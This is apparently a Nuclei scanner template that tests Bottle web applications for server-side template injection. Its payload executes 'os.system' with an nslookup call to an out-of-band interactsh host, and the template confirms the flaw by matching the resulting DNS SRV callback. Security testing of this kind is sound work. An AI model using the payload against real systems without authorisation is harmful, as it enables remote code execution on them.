id: bottle-oob
info:
  name: Bottle - Out of Band Template Injection
  author: 0xAwali,DhiyaneshDK
  severity: high
  reference:
    - https://bottlepy.org/docs/dev/
    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
  metadata:
    verified: true
  tags: dast,oast,oob,ssti,vuln
variables:
  oast: '{{interactsh-url}}'
http:
  - fuzzing:
      - fuzz:
          - '{{injection}}'
        mode: single
        parts:
          - query
          - body
        type: postfix
    matchers:
      - condition: and
        # digest: 4b0a00483046022100e23b3dc1c87488306c2a6219ef7237f7e5c925b910901db5ef6f6114124d4cb6022100b614c0bbdd924bb74ab7aa252d7a8b5292befe98a4ed5a0e17785a2019525e5c:922c64590222798bb761d5b6d8e72950

        dsl:
          - contains(interactsh_protocol,'dns')
          - contains(interactsh_request,'srv')
        name: request-matcher
        type: dsl
    payloads:
      injection:
        - '{{exec(''import+os'')}}{{exec(''os.system("nslookup+-type=SRV+{{interactsh-url}}")'')}}'
    pre-condition:
      - dsl:
          - method == "GET"
          - method == "POST"
          - method == "PUT"
        type: dsl
    skip-variables-check: true
